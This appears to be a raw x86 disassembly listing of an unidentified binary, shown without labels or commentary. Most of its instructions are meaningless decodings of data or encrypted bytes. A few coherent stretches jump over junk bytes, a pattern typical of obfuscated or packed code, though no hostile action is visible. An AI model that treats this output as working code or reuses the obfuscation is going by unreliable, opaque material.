  419ae4:	mov    ah,0x8c
  419ae6:	scas   eax,DWORD PTR es:[edi]
  419ae7:	enter  0x2090,0x25
  419aeb:	arpl   WORD PTR [edx+0x97451a5],di
  419af1:	sbb    DWORD PTR [eax-0x71],ebp
  419af4:	cmp    ebx,edx
  419af6:	lods   eax,DWORD PTR ds:[esi]
  419af7:	inc    edi
  419af8:	rcr    BYTE PTR [ebp+0x50],0x58
  419afc:	shr    DWORD PTR [edi],0xd8
  419aff:	popf   
  419b00:	xor    esi,DWORD PTR [esi]
  419b02:	dec    ecx
  419b03:	out    0xdf,eax
  419b05:	sbb    al,0x36
  419b07:	jmp    0x419b07
  419b09:	jb     0x419ab5
  419b0b:	or     esp,esp
  419b0d:	std    
  419b0e:	test   eax,0xc76f21d5
  419b13:	in     al,dx
  419b14:	mov    ?,ebx
  419b16:	popa   
  419b17:	loope  0x419ae1
  419b19:	or     cl,BYTE PTR [eax+0x892890f]
  419b1f:	inc    ebp
  419b20:	(bad)  
  419b21:	adc    al,0xeb
  419b23:	push   eax
  419b24:	cs dec edx
  419b26:	ret    0x2c1d
  419b29:	mov    esi,0xcb4949fd
  419b2e:	cmp    eax,0x9c6e9695
  419b33:	outs   dx,DWORD PTR ds:[esi]
  419b34:	popa   
  419b35:	inc    edi
  419b36:	xbegin 0x8c00e7d1
  419b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b3d:	cli    
  419b3e:	and    BYTE PTR [edx-0x27],bl
  419b41:	hlt    
  419b42:	jns    0x419b1d
  419b44:	inc    ebp
  419b45:	lods   eax,DWORD PTR ds:[esi]
  419b46:	adc    DWORD PTR [ecx],edi
  419b48:	cmp    BYTE PTR [esi-0x54b8c44f],dh
  419b4e:	mov    esi,0x55d3d42e
  419b53:	loope  0x419b4b
  419b55:	xchg   ebx,eax
  419b56:	sub    al,BYTE PTR [ebx-0x6c47228f]
  419b5c:	jmp    0x562f56fd
  419b61:	dec    edx
  419b62:	pop    ds
  419b63:	xor    al,0x24
  419b65:	idiv   DWORD PTR [edi+0x75fe751e]
  419b6b:	ret    0x5cb5
  419b6e:	cmp    al,0xed
  419b70:	sub    eax,0x6f06819a
  419b75:	lock push edi
  419b77:	mov    dh,0xdc
  419b79:	(bad)  
  419b7a:	xchg   esi,eax
  419b7b:	mov    DWORD PTR [ebx-0x5f],eax
  419b7e:	div    BYTE PTR [edx-0x22ad1c85]
  419b84:	mov    bh,0x15
  419b86:	mov    ds:0x754722bf,eax
  419b8b:	sbb    eax,esi
  419b8d:	sub    eax,0xbdf361c9
  419b92:	jmp    0xbb17:0xcb7392d4
  419b99:	mov    ds:0xda549644,al
  419b9e:	jmp    DWORD PTR [eax]
  419ba0:	aad    0x96
  419ba2:	add    ecx,ecx
  419ba4:	test   al,0xb1
  419ba6:	das    
  419ba7:	nop
  419ba8:	imul   edi,DWORD PTR [ebx],0x18
  419bab:	aaa    
  419bac:	inc    eax
  419bad:	sbb    al,0xcc
  419baf:	pop    ebx
  419bb0:	dec    ebp
  419bb1:	cmp    ah,BYTE PTR [ebp-0x746739b2]
  419bb7:	pop    ecx
  419bb8:	sub    BYTE PTR [esi],dl
  419bba:	pop    es
  419bbb:	out    0xbd,eax
  419bbd:	das    
  419bbe:	xor    edi,esp
  419bc0:	sbb    al,0x7a
  419bc2:	dec    edi
  419bc3:	dec    edx
  419bc4:	out    dx,al
  419bc5:	scas   eax,DWORD PTR es:[edi]
  419bc6:	push   eax
  419bc7:	mov    bh,0xbd
  419bc9:	jmp    0x419bfb
  419bcb:	or     al,0xa6
  419bcd:	inc    ecx
  419bce:	sub    eax,0x78eb794c
  419bd3:	fnstsw WORD PTR [eax-0x5d]
  419bd6:	fcomp  DWORD PTR [esi]
  419bd8:	imul   edx,esi,0x8facbe25
  419bde:	or     bh,BYTE PTR [ebp+ecx*1-0x7d]
  419be2:	cmp    BYTE PTR [esi],al
  419be4:	jns    0x419c2f
  419be6:	pop    ebx
  419be7:	cmp    al,BYTE PTR ds:0xc7db5453
  419bed:	loopne 0x419be8
  419bef:	jge    0x419bb1
  419bf1:	add    ebp,DWORD PTR [eax]
  419bf3:	(bad)  
  419bf5:	add    BYTE PTR [ebp+0x3d],bh
  419bf8:	iret   
  419bf9:	fisub  WORD PTR [edx+0x27]
  419bfc:	xchg   edi,eax
  419bfd:	adc    eax,0x57e27df5
  419c02:	test   ah,ah
  419c04:	aaa    
  419c05:	sti    
  419c06:	cmp    DWORD PTR [edx],esp
  419c08:	or     esp,DWORD PTR [esi+edx*2]
  419c0b:	stos   BYTE PTR es:[edi],al
  419c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c0d:	mov    ecx,DWORD PTR [edi-0x7d]
  419c10:	mov    BYTE PTR [eax+0x26],cl
  419c13:	fiadd  WORD PTR ss:[edi-0x5faa5ef3]
  419c1a:	cmp    DWORD PTR [esp+edx*8-0x4e536abf],0xf1592a5a
  419c25:	mov    al,0x72
  419c27:	ins    BYTE PTR es:[edi],dx
  419c28:	xchg   ecx,eax
  419c29:	xchg   DWORD PTR [esi-0xa],esp
  419c2c:	stos   DWORD PTR es:[edi],eax
  419c2d:	mov    esi,0x2f04eb72
  419c32:	adc    BYTE PTR [edi+0x4c],bl
  419c35:	xchg   ebp,eax
  419c36:	ins    DWORD PTR es:[edi],dx
  419c37:	adc    ah,BYTE PTR [ebp+0x86d7857]
  419c3d:	sbb    DWORD PTR [esi+ebx*8+0x59],ebx
  419c41:	sbb    cl,ah
  419c43:	fwait
  419c44:	imul   esp,DWORD PTR [esi],0x6
  419c47:	(bad)  
  419c48:	repz jl 0x419cc8
  419c4b:	mov    ecx,0x6c191fa5
  419c50:	cld    
  419c51:	jne    0x419bef
  419c53:	arpl   bx,dx
  419c55:	les    ebp,FWORD PTR ds:0x3ccd6989
  419c5b:	pushf  
  419c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c5d:	xchg   ecx,eax
  419c5e:	add    al,0x96
  419c60:	fnstsw ax
  419c62:	ins    DWORD PTR es:[edi],dx
  419c63:	mov    ch,BYTE PTR [eax-0x45]
  419c66:	ja     0x419c2b
  419c68:	mov    ecx,0x727a5816
  419c6d:	pop    ecx
  419c6e:	adc    al,0x7f
  419c70:	adc    ah,ah
  419c72:	add    edx,esi
  419c74:	mov    al,ds:0xe42b5521
  419c79:	rcr    DWORD PTR [eax-0x2],1
  419c7c:	or     eax,0x5f8d795a
  419c81:	fcmovnb st,st(6)
  419c83:	idiv   ecx
  419c85:	sar    BYTE PTR [edx],0x57
  419c88:	sbb    ebx,DWORD PTR [edx+0x40]
  419c8b:	stc    
  419c8c:	pop    esi
  419c8d:	mov    eax,DWORD PTR [edx]
  419c8f:	(bad)  [eax+ebx*2-0x66]
  419c93:	jg     0x419cf9
  419c95:	mov    ebx,0xf2720e89
  419c9a:	push   cs
  419c9b:	mov    eax,ds:0xaf43b6c9
  419ca0:	adc    ch,0x2c
  419ca3:	adc    eax,0x795a93e2
  419ca8:	cmp    ch,BYTE PTR [ebx]
  419caa:	aad    0xae
  419cac:	int    0x44
  419cae:	repnz lods al,BYTE PTR ds:[esi]
  419cb0:	jo     0x419c89
  419cb2:	jp     0x419c4a
  419cb4:	nop
  419cb5:	test   BYTE PTR [edx-0x37f568b3],ch
  419cbb:	dec    esp
  419cbc:	adc    eax,edx
  419cbe:	mov    al,0xe0
  419cc0:	cmp    ebx,esi
  419cc2:	fs pop edi
  419cc4:	or     dl,BYTE PTR [esi+0x4354a7d6]
  419cca:	fucom  st(4)
  419ccc:	jae    0x419d4d
  419cce:	push   esp
  419ccf:	scas   eax,DWORD PTR es:[edi]
  419cd0:	xor    al,0xf5
  419cd2:	daa    
  419cd3:	dec    edi
  419cd4:	in     al,dx
  419cd5:	pop    esi
  419cd6:	ins    BYTE PTR es:[edi],dx
  419cd7:	int    0xef
  419cd9:	push   ecx
  419cda:	jno    0x419d45
  419cdc:	and    esp,DWORD PTR [edi]
  419cde:	out    0xe3,eax
  419ce0:	cs (bad) 
  419ce2:	shl    bh,0x5
  419ce5:	ss xchg esp,eax
  419ce7:	push   esi
  419ce8:	adc    BYTE PTR [ebx-0x8],bh
  419ceb:	mov    ebx,0x5b9a7fb7
  419cf0:	scas   al,BYTE PTR es:[edi]
  419cf1:	cmp    DWORD PTR [ecx+edi*4-0x21],0xd1d692a0
  419cf9:	jl     0x419cba
  419cfb:	loopne 0x419d67
  419cfd:	ficomp WORD PTR [esi]
  419cff:	pop    esp
  419d00:	add    bl,dl
  419d02:	mov    ds:0x435b8550,eax
  419d07:	enter  0x5756,0x19
  419d0b:	mov    al,ds:0x663a8fd4
  419d10:	test   al,0x38
  419d12:	or     edi,DWORD PTR [ebx-0x5c]
  419d15:	imul   eax,ebp,0xfffffffb
  419d18:	mov    eax,edi
  419d1a:	xchg   ebx,eax
  419d1b:	or     BYTE PTR [eax-0x16c1dce8],0xa7
  419d22:	adc    dl,BYTE PTR ds:0xa0ca76aa
  419d28:	xor    ecx,DWORD PTR [edx-0x5]
  419d2b:	or     BYTE PTR [esi-0x3b78f55e],al
  419d31:	sbb    DWORD PTR [esp+edx*4],ebx
  419d34:	repz xor bh,BYTE PTR [eax-0x7b]
  419d38:	std    
  419d39:	xchg   BYTE PTR [ebx+0x46],ch
  419d3c:	xor    ah,BYTE PTR [eax+0x1b576b77]
  419d42:	outs   dx,DWORD PTR ds:[esi]
  419d43:	ret    
  419d44:	and    BYTE PTR ds:0xe58f4ae6,cl
  419d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d4b:	cwde   
  419d4c:	or     BYTE PTR [esi],0x9e
  419d4f:	fcomp  DWORD PTR [ebx]
  419d51:	inc    ecx
  419d52:	dec    esp
  419d53:	jl     0x419d6b
  419d55:	in     al,dx
  419d56:	inc    ebx
  419d57:	add    al,0xe3
  419d59:	lods   eax,DWORD PTR ds:[esi]
  419d5a:	or     eax,0xbfcaee6b
  419d5f:	fsubr  DWORD PTR [edi-0x3]
  419d62:	sub    DWORD PTR [ecx+0x1d],edi
  419d65:	outs   dx,BYTE PTR ds:[esi]
  419d66:	shl    DWORD PTR [ebx-0x7f],0x73
  419d6a:	sub    DWORD PTR [edx-0xa],0x46
  419d6e:	scas   eax,DWORD PTR es:[edi]
  419d6f:	xchg   ecx,eax
  419d70:	pop    eax
  419d71:	stos   BYTE PTR es:[edi],al
  419d72:	jno    0x419dbd
  419d74:	ret    
  419d75:	inc    eax
  419d76:	(bad)  
  419d77:	aaa    
  419d78:	rcl    BYTE PTR [esi+esi*4],1
  419d7b:	lods   eax,DWORD PTR ds:[esi]
  419d7c:	fwait
  419d7d:	mov    ch,0xb9
  419d7f:	ss cmc 
  419d81:	je     0x419d3e
  419d83:	mov    WORD PTR [ecx+0x45468797],gs
  419d89:	enter  0x3b09,0x8
  419d8d:	stos   BYTE PTR es:[edi],al
  419d8e:	pop    es
  419d8f:	out    dx,eax
  419d90:	jge    0x419e06
  419d92:	loop   0x419d64
  419d94:	cmp    al,0x72
  419d96:	bound  ebx,QWORD PTR [ebx+0x659e826]
  419d9c:	idiv   DWORD PTR [ebx-0x75]
  419d9f:	call   0xdd91e0e1
  419da4:	cmp    bl,cl
  419da6:	test   al,0x1c
  419da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419da9:	retf   
  419daa:	push   edi
  419dab:	popa   
  419dac:	push   edx
  419dad:	pop    eax
  419dae:	inc    eax
  419daf:	pop    eax
  419db0:	inc    ebp
  419db1:	je     0x419dd3
  419db3:	scas   eax,DWORD PTR es:[edi]
  419db4:	dec    esi
  419db5:	inc    edx
  419db6:	dec    edi
  419db7:	mov    al,0xf4
  419db9:	xchg   BYTE PTR [edi-0x69a32b9e],ah
  419dbf:	sbb    al,0xff
  419dc1:	test   al,0xe
  419dc3:	ins    DWORD PTR es:[edi],dx
  419dc4:	into   
  419dc5:	std    
  419dc6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  419dc8:	mov    cs,WORD PTR [ecx+0x20]
  419dcb:	outs   dx,BYTE PTR ds:[esi]
  419dcc:	adc    eax,0x949a389c
  419dd1:	pop    ebp
  419dd2:	fbld   TBYTE PTR [esi+0x70]
  419dd5:	mov    ds:0xe838d5c,al
  419dda:	clc    
  419ddb:	push   es
  419ddc:	pop    edi
  419ddd:	and    dl,ah
  419ddf:	int    0x57
  419de1:	mov    eax,0x2011ad0c
  419de6:	add    ebp,DWORD PTR [eax]
  419de8:	mov    ebx,0x9d2421e7
  419ded:	jmp    0x419e5d
  419def:	xor    dl,dh
  419df1:	fs push edi
  419df3:	sub    dl,ch
  419df5:	arpl   WORD PTR [edx-0x526ce30a],dx
  419dfb:	cwde   
  419dfc:	in     eax,dx
  419dfd:	sub    eax,0xb810e076
  419e02:	cmp    BYTE PTR [eax+0x78],al
  419e05:	sub    BYTE PTR [ecx+0x70076b01],bl
  419e0b:	ss xchg ebp,eax
  419e0d:	xchg   ebp,eax
  419e0e:	sahf   
  419e0f:	dec    edx
  419e10:	outs   dx,DWORD PTR ds:[esi]
  419e11:	pop    edx
  419e12:	std    
  419e13:	inc    esi
  419e14:	jne    0x419e49
  419e16:	(bad)  
  419e17:	iret   
  419e18:	test   BYTE PTR [edi-0x4cd551f1],dh
  419e1e:	jg     0x419e77
  419e20:	xchg   BYTE PTR [di],dl
  419e23:	adc    esi,DWORD PTR ds:0x4d65cd73
  419e29:	xor    al,0x25
  419e2b:	xchg   esp,eax
  419e2c:	mov    eax,0x562641a0
  419e31:	fisttp DWORD PTR [esp+ecx*2+0x4c8bfb3f]
  419e38:	and    al,0x14
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x6a45ff95
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	into   
  419e6f:	ret    0x26c0
  419e72:	cmp    edx,eax
  419e74:	mov    dh,0xe9
  419e76:	pop    edi
  419e77:	dec    ebx
  419e78:	pop    ds
  419e79:	cmp    eax,0xb7b3f1c3
  419e7e:	xchg   esi,eax
  419e7f:	mov    ebp,0xb06b6a53
  419e84:	xchg   esp,eax
  419e85:	fidivr WORD PTR [ecx]
  419e87:	sti    
  419e88:	and    al,0xd0
  419e8a:	pop    ebx
  419e8b:	xor    edi,esp
  419e8d:	fist   WORD PTR [ecx+0x35]
  419e90:	out    0xcc,al
  419e92:	ret    0xb27
  419e95:	adc    ebx,edx
  419e97:	and    eax,0x3588b070
  419e9c:	call   0x5dba1084
  419ea1:	jmp    0xb62183cf
  419ea6:	mov    cl,bh
  419ea8:	je     0x419e70
  419eaa:	stc    
  419eab:	hlt    
  419eac:	mov    eax,ds:0x25fd59c0
  419eb1:	out    0x28,eax
  419eb3:	inc    ebp
  419eb4:	mov    esi,0x184e4e6d
  419eb9:	hlt    
  419eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ebb:	in     eax,0x25
  419ebd:	dec    ebx
  419ebe:	test   BYTE PTR [ebx],ch
  419ec0:	adc    esp,ebp
  419ec2:	mov    ecx,DWORD PTR [ebx+0x2a04d8a2]
  419ec8:	push   0xcfa8eb83
  419ecd:	jmp    0xc526:0xa282f8b0
  419ed4:	mov    ah,0xda
  419ed6:	es jo  0x419f0c
  419ed9:	mov    dl,0x3
  419edb:	sub    dl,BYTE PTR [ebx]
  419edd:	sub    ebx,DWORD PTR [edx]
  419edf:	pop    ss
  419ee0:	loopne 0x419e88
  419ee2:	shl    DWORD PTR [esp+ebp*4+0x5384e69c],1
  419ee9:	repnz pop ss
  419eeb:	aaa    
  419eec:	fidiv  DWORD PTR [esi-0x7e48f8bd]
  419ef2:	mov    ah,0xe3
  419ef4:	icebp  
  419ef5:	cs dec eax
  419ef7:	imul   edx,DWORD PTR [ebx],0x4b3920cc
  419efd:	cmc    
  419efe:	and    ah,BYTE PTR ds:0xe015d705
  419f04:	retf   0xf266
  419f07:	dec    ebx
  419f08:	mov    al,ds:0x2e09b0c7
  419f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f0e:	push   esi
  419f0f:	das    
  419f10:	daa    
  419f11:	cs push edx
  419f13:	xor    DWORD PTR [ebx],esi
  419f15:	add    ah,BYTE PTR [ebx+0x25af408e]
  419f1b:	push   edx
  419f1c:	pop    edi
  419f1d:	(bad)  
  419f1e:	jmp    0x419f89
  419f20:	inc    esp
  419f21:	xor    al,0xc0
  419f23:	xchg   edi,eax
  419f24:	mov    WORD PTR [eax+ecx*8+0x0],ds
  419f28:	mov    esi,esp
  419f2a:	jnp    0x419f7c
  419f2c:	fdiv   QWORD PTR [edx-0x60d817b3]
  419f32:	ds mov ebx,0x9828fd8
  419f38:	dec    esi
  419f39:	add    esi,DWORD PTR [ebp+0x5ddf436b]
  419f3f:	push   0x3723668f
  419f44:	fisttp WORD PTR [ebp-0x7a]
  419f47:	cmp    bh,bl
  419f49:	push   ecx
  419f4a:	(bad)  
  419f4b:	out    dx,eax
  419f4c:	jmp    0x9d81:0xc45f81a9
  419f53:	test   eax,0xd9951fd7
  419f58:	jl     0x419f0a
  419f5a:	or     eax,DWORD PTR ds:0x66730353
  419f60:	inc    ebx
  419f61:	out    0x8e,eax
  419f63:	imul   esi,DWORD PTR [esi+0x6f02a9b5],0x9ea65d9a
  419f6d:	mov    dh,0x50
  419f6f:	fcomp  DWORD PTR ds:0x8966c34f
  419f75:	jnp    0x419f6c
  419f77:	push   eax
  419f78:	or     esp,DWORD PTR [edx+ebp*1+0x1e7f1bbb]
  419f7f:	imul   esi,ebx,0x2cb2f955
  419f85:	retf   
  419f86:	jo     0x419ffd
  419f88:	mov    ecx,0x2a2b23ee
  419f8d:	ja     0x419fc6
  419f8f:	or     DWORD PTR [edi+0x1a9ed60d],ebp
  419f95:	sbb    esp,DWORD PTR [edi+0x4466f808]
  419f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f9c:	mov    esp,0x62a03d7a
  419fa1:	ja     0x419fcb
  419fa3:	(bad)  
  419fa4:	div    ah
  419fa6:	cmp    ecx,DWORD PTR [edx-0x30]
  419fa9:	xchg   esi,eax
  419faa:	lahf   
  419fab:	cdq    
  419fac:	jb     0x419f6b
  419fae:	out    dx,al
  419faf:	fsub   QWORD PTR [eax]
  419fb1:	(bad)  [ecx]
  419fb3:	jl     0x419f70
  419fb5:	pop    ebp
  419fb6:	out    dx,eax
  419fb7:	lds    edi,FWORD PTR [edx-0x6bfbdccc]
  419fbd:	xchg   ebp,eax
  419fbe:	cli    
  419fbf:	sub    BYTE PTR [eax],0xfe
  419fc2:	or     cl,BYTE PTR [ebx+0x3c]
  419fc5:	sbb    DWORD PTR [edi-0x72],0xe220c28b
  419fcc:	xor    DWORD PTR [edi+0x559990f0],esp
  419fd2:	sub    esi,DWORD PTR [ebx+0x52]
  419fd5:	shr    ecx,0x44
  419fd8:	sbb    edx,DWORD PTR [edx-0xe]
  419fdb:	inc    esi
  419fdc:	mov    dh,0xfd
  419fde:	and    esi,DWORD PTR [ecx+0x6a7affba]
  419fe4:	js     0x419f97
  419fe6:	mov    al,0x4c
  419fe8:	dec    ebx
  419fe9:	aad    0xad
  419feb:	dec    DWORD PTR [ecx+0x388d16c]
  419ff1:	in     al,0xf8
  419ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ff4:	jb     0x41a04e
  419ff6:	mov    al,0x39
  419ff8:	xor    ch,al
  419ffa:	jnp    0x41a037
  419ffc:	call   0x43cb:0x76bbc633
  41a003:	xchg   esp,eax
  41a004:	cmp    eax,0xac0e761
  41a009:	pop    ss
  41a00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a00b:	sbb    dl,BYTE PTR ds:0x4adffc4b
  41a011:	fs jmp 0x1828:0xdf3e11cb
  41a019:	mov    ch,0x2a
  41a01b:	inc    ecx
  41a01c:	jl     0x419fba
  41a01e:	add    eax,0xbdc34dda
  41a023:	add    BYTE PTR [eax-0x80],0x3c
  41a027:	int3   
  41a028:	mov    eax,ds:0x1b55e072
  41a02d:	out    dx,eax
  41a02e:	mov    al,ds:0x2316e137
  41a033:	sub    eax,0x3e782082
  41a038:	push   es
  41a039:	into   
  41a03a:	loopne 0x41a02a
  41a03c:	dec    esp
  41a03d:	in     eax,0x44
  41a03f:	inc    esp
  41a040:	out    dx,eax
  41a041:	dec    esp
  41a042:	scas   al,BYTE PTR es:[edi]
  41a043:	xchg   BYTE PTR [eax-0x68],dl
  41a046:	gs inc ecx
  41a048:	xchg   esp,eax
  41a049:	loope  0x41a0ca
  41a04b:	ss retf 0xfa00
  41a04f:	and    eax,0xe39fca30
  41a054:	mov    ecx,0x350a1d00
  41a059:	aad    0x70
  41a05b:	xchg   edx,eax
  41a05c:	fld    TBYTE PTR [ecx-0x3]
  41a05f:	mov    cl,0x3b
  41a061:	push   ebp
  41a062:	jp     0x419ff3
  41a064:	push   esi
  41a065:	sahf   
  41a066:	out    0xe8,eax
  41a068:	call   0x4679:0xd2f321ba
  41a06f:	cld    
  41a070:	fistp  DWORD PTR [eax+0x1feb43e8]
  41a076:	jl     0x41a022
  41a078:	push   ss
  41a079:	int3   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	sub    ecx,DWORD PTR [ecx]
  41a07d:	ret    0x6c69
  41a080:	setnp  BYTE PTR [edx]
  41a083:	jp     0x41a014
  41a085:	fild   QWORD PTR [ebx]
  41a087:	mov    dl,0x31
  41a089:	out    0x27,al
  41a08b:	cmp    eax,0xa94817fe
  41a090:	ins    DWORD PTR es:[edi],dx
  41a091:	lahf   
  41a092:	xchg   esp,eax
  41a093:	add    DWORD PTR [ebp-0x30],ebx
  41a096:	lods   al,BYTE PTR ds:[esi]
  41a097:	test   al,0xa3
  41a099:	mov    ds:0x62260095,eax
  41a09e:	popf   
  41a09f:	retf   
  41a0a0:	out    dx,eax
  41a0a1:	add    eax,0x44c5ac08
  41a0a6:	push   ebp
  41a0a7:	or     DWORD PTR [eax+0x2b],0xe
  41a0ab:	push   esp
  41a0ac:	fcomp  DWORD PTR [edi+0x14]
  41a0af:	inc    edi
  41a0b0:	add    bh,BYTE PTR [esi]
  41a0b2:	icebp  
  41a0b3:	pop    ecx
  41a0b4:	in     eax,0xce
  41a0b6:	and    ebp,DWORD PTR [eax+0x4d]
  41a0b9:	xchg   BYTE PTR [edx+edx*8],ch
  41a0bc:	mov    bh,0x53
  41a0be:	jne    0x41a045
  41a0c0:	fld    DWORD PTR [ecx+0x67]
  41a0c3:	xor    BYTE PTR [esi],cl
  41a0c5:	dec    edx
  41a0c6:	add    BYTE PTR [ebx],dh
  41a0c8:	jmp    0x1399:0x1c015452
  41a0cf:	test   DWORD PTR [ebx],esi
  41a0d1:	scas   al,BYTE PTR es:[edi]
  41a0d2:	outs   dx,DWORD PTR ds:[esi]
  41a0d3:	adc    eax,0xe516ac0d
  41a0d8:	out    0xae,eax
  41a0da:	fdiv   st(7),st
  41a0dc:	fwait
  41a0dd:	(bad)  
  41a0de:	cmp    DWORD PTR [esi-0x3794d680],esp
  41a0e4:	sbb    DWORD PTR [ebx+0x6bec7ff3],ebx
  41a0ea:	xchg   BYTE PTR [esp+edi*1-0x394e6f6c],ah
  41a0f1:	inc    edx
  41a0f2:	jb     0x41a124
  41a0f4:	fwait
  41a0f5:	js     0x41a131
  41a0f7:	je     0x41a104
  41a0f9:	scas   al,BYTE PTR es:[edi]
  41a0fa:	mov    ch,0x70
  41a0fc:	mov    eax,0x25786afa
  41a101:	fmul   DWORD PTR [edx+eiz*2+0x27]
  41a105:	and    eax,eax
  41a107:	cld    
  41a108:	rol    bh,0xeb
  41a10b:	inc    esi
  41a10c:	imul   ebx,DWORD PTR [eax-0x3ba95033],0x4572712
  41a116:	and    dl,al
  41a118:	int    0xfe
  41a11a:	stc    
  41a11b:	or     cl,BYTE PTR [ebx-0x6e]
  41a11e:	sbb    ebx,DWORD PTR [ebp+0x7c]
  41a121:	fwait
  41a122:	and    bh,al
  41a124:	das    
  41a125:	jmp    0x7330:0x63853b14
  41a12c:	mov    ds:0x26406d39,eax
  41a131:	stc    
  41a132:	addr16 js 0x41a0e4
  41a135:	cmc    
  41a136:	(bad)  
  41a137:	loopne 0x41a0eb
  41a139:	xchg   DWORD PTR [ebp-0x23],edx
  41a13c:	push   esi
  41a13d:	add    eax,0xc2080f46
  41a142:	outs   dx,DWORD PTR ds:[esi]
  41a143:	or     DWORD PTR [ecx+edx*1+0x314a6ccf],0xffffff99
  41a14b:	lahf   
  41a14c:	inc    edx
  41a14d:	mov    esp,0x3859396d
  41a152:	lods   al,BYTE PTR ds:[esi]
  41a153:	mov    ch,0xdd
  41a155:	mov    ecx,0x406e85fe
  41a15a:	inc    ebx
  41a15b:	jno    0x41a1c1
  41a15d:	add    eax,0x1b4e5118
  41a162:	loop   0x41a0fe
  41a164:	enter  0xce41,0x6b
  41a168:	sub    edi,edx
  41a16a:	sub    DWORD PTR [ebp+0x2d],edi
  41a16d:	inc    edx
  41a16e:	ins    BYTE PTR es:[edi],dx
  41a16f:	sub    DWORD PTR [ebx+0x71518e8d],ebp
  41a175:	jno    0x41a156
  41a177:	fldcw  WORD PTR [edi]
  41a179:	rcl    DWORD PTR [esi],cl
  41a17b:	test   al,0xa4
  41a17d:	pop    es
  41a17e:	mov    al,0x77
  41a180:	mov    gs,WORD PTR [ecx]
  41a182:	or     al,0x17
  41a184:	int3   
  41a185:	mov    BYTE PTR [edi-0x47],bh
  41a188:	outs   dx,BYTE PTR ds:[esi]
  41a189:	lods   al,BYTE PTR ds:[esi]
  41a18a:	add    dh,BYTE PTR [edi+0xdd5cfb0]
  41a190:	cs fwait
  41a192:	xchg   ecx,eax
  41a193:	cld    
  41a194:	ror    BYTE PTR [ebx-0x2a39ee33],0x21
  41a19b:	xchg   al,al
  41a19d:	sub    al,0x42
  41a19f:	not    ah
  41a1a1:	sub    edi,ebx
  41a1a3:	clc    
  41a1a4:	sub    al,0xa8
  41a1a7:	je     0x41a219
  41a1a9:	pop    edx
  41a1aa:	int    0xff
  41a1ac:	call   0xcec2:0x2fd6c22d
  41a1b3:	in     al,0xef
  41a1b5:	jne    0x41a141
  41a1b7:	jmp    0x4bb10507
  41a1bc:	and    eax,0x6b3ea3e0
  41a1c1:	dec    esi
  41a1c2:	cmp    al,0x8b
  41a1c4:	test   al,0xaf
  41a1c6:	ficom  WORD PTR [eax+ecx*2+0x39]
  41a1ca:	adc    al,0x6
  41a1cc:	xchg   edi,eax
  41a1cd:	adc    BYTE PTR ds:0x34a057e5,0xd9
  41a1d4:	add    eax,0x5ecbaad3
  41a1d9:	mov    edi,0x18ad69cb
  41a1de:	xchg   ebx,eax
  41a1df:	imul   ebp,edi,0x77
  41a1e2:	dec    esp
  41a1e3:	or     BYTE PTR [esi],dh
  41a1e5:	mov    ecx,0xf99d863c
  41a1ea:	or     eax,0x5154e9b5
  41a1ef:	push   eax
  41a1f0:	popa   
  41a1f1:	imul   DWORD PTR ss:[ecx+eiz*4+0x332048c0]
  41a1f9:	les    esp,FWORD PTR [eax-0x11f0d33e]
  41a1ff:	push   eax
  41a200:	lea    ecx,[edi]
  41a202:	iret   
  41a203:	clc    
  41a204:	sbb    cl,BYTE PTR [ecx+0x7cc4086c]
  41a20a:	leave  
  41a20b:	(bad)  
  41a20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a20d:	jo     0x41a226
  41a20f:	rol    BYTE PTR [ebx+ebp*1-0x4678bdad],cl
  41a216:	xchg   BYTE PTR [ebp+0x66],bl
  41a219:	popa   
  41a21a:	lods   al,BYTE PTR ds:[esi]
  41a21b:	and    eax,0x513deb7c
  41a220:	and    eax,0x325d
  41a225:	mov    DWORD PTR [esp+0x50],eax
  41a229:	and    ecx,0x3544
  41a22f:	mov    DWORD PTR [esp+0x54],ecx
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	mov    esp,0x2b7edf5c
  41a2a5:	lods   eax,DWORD PTR ds:[esi]
  41a2a6:	push   ss
  41a2a7:	sbb    BYTE PTR [edx+edx*1+0x50ee1818],bh
  41a2ae:	aaa    
  41a2af:	stc    
  41a2b0:	push   ebx
  41a2b1:	jns    0x41a266
